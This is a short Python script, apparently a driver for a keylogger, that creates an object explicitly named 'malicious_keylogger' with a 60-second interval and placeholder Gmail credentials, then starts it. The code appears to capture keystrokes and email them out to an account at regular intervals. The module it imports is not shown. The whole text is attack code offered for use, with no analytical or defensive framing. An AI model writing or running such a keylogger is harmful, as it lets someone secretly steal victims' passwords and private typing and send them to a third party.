import keylogger
malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'your_mail_id@gmail.com', 'mail_password')
malicious_keylogger.start()
